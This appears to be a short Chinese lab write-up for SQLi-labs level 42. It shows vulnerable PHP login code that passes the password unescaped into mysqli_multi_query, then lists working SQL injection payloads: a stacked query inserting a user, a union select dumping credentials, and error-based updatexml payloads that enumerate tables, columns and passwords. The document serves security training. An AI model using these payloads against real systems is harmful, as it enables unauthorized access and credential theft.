---
title: less42
url: https://www.yuque.com/u29002979/ep2zrx/pctnzgpgmpd94myd
---

```bash
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];

$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
if (@mysqli_multi_query($con1, $sql))
```

这关的注入点在密码登陆处，同时也存在堆叠注入 , 单引号闭合 <a name="I3o7P"></a>

# 堆叠注入

`';insert into users values(98,'zhong','zhong')#`

`-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+`

<a name="jykDm"></a>

# 注入点检查

`login_user=admin'&login_password=admin'`

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin''' at line 1

<a name="Os6ES"></a>

# 报错注入

```bash
查询数据库表
-1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
爆破数据表
-1' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
爆破字段名
-1' or updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) -- +
爆破字段
login_password=-1' or updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) -- +
```
